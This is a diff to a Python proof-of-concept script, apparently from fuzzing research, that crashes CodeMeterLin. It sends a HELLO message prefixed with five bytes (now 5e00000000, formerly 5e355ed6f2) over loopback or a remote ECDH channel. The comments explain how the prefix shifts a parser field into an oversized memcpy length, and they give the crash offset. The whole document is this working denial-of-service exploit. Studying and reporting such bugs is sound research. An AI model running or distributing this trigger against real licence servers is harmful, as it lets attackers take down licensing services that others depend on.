@@ -9,17 +9,17 @@ Important separation:
 1. The AES/CRC/selector/SAMC framing below is only transport machinery. In
    loopback mode it uses selector 0xa0; in remote mode it uses ECDH init
    followed by selector 0xa1.
-2. The actual crash trigger is only five cleartext bytes inserted before a
-   normal HELLO:
+2. The actual crash trigger is only a five-byte cleartext prefix inserted
+   before a normal HELLO:
 
-       5e 35 5e d6 f2 || canonical HELLO with a fresh client token
+       5e 00 00 00 00 || canonical HELLO with a fresh client token
 
 3. After decryption, CodeMeterLin parses the shifted HELLO bytes as if they
    were normal structured fields. The first 16 bytes of the mutated cleartext
    become these little-endian 32-bit words:
 
-       bytes: 5e 35 5e d6  f2 0a 00 00  00 00 00 00  10 00 00 28
-       u32:   0xd65e355e  0x00000af2  0x00000000  0x28000010
+       bytes: 5e 00 00 00  00 0a 00 00  00 00 00 00  10 00 00 28
+       u32:   0x0000005e  0x00000a00  0x00000000  0x28000010
 
 4. In the crashing cores, the parser copies the fourth word into the parser
    object:
@@ -56,17 +56,20 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
-# The reduced mutation. These exact bytes came from the high-throughput
-# attribution run:
+# The reduced mutation. The original high-throughput attribution run found
+# HISTORICAL_PREFIX_HEX; the ECDH prefix campaign later showed the filler bytes
+# can be zeroed while preserving the same shifted 0x28000010 word and
+# CodeMeterLin+0x8f431d crash signature.
 #
 #   worker_09/ring/iter_00004667/
 #   mutation: insert_rand at position 0
 #   inserted bytes: 5e355ed6f2
 #
-# They are intentionally not "magic crypto" bytes. They are just plaintext
+# These are intentionally not "magic crypto" bytes. They are just plaintext
 # bytes that shift the following canonical HELLO fields into parser slots that
 # later feed the copy helper.
-DEFAULT_PREFIX_HEX = "5e355ed6f2"
+DEFAULT_PREFIX_HEX = "5e00000000"
+HISTORICAL_PREFIX_HEX = "5e355ed6f2"
 
 # In the deterministic cores, this shifted word is stored at parser object
 # offset +0x68 and later appears in rbx as memcpy's length.
@@ -288,8 +291,11 @@ def main() -> int:
         description="Send the deterministic prefixed-HELLO crash packet.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=r"""Crash origin, in one line:
-  prefixing HELLO with 5e355ed6f2 makes the parser see u32 0x28000010
+  prefixing HELLO with 5e00000000 makes the parser see u32 0x28000010
   at the field that is later copied into this+0x68 and used as memcpy length.
+
+The older captured prefix 5e355ed6f2 reaches the same layout; the default is
+the simpler zero-tail form found by the ECDH prefix campaign.
 
 After any required channel setup, this sends only one application frame:
 the mutated HELLO. It does not send ACK or 0x64.
@@ -334,7 +340,7 @@ application plaintext over the ECDH-selected channel:
 
     # This is the actual reduced bug trigger:
     #
-    #   mutated_hello = 5e355ed6f2 || canonical_hello
+    #   mutated_hello = 5e00000000 || canonical_hello
     #
     # Everything after this point is just SAMC wire encoding and sending.
     prefix = bytes.fromhex(args.prefix)
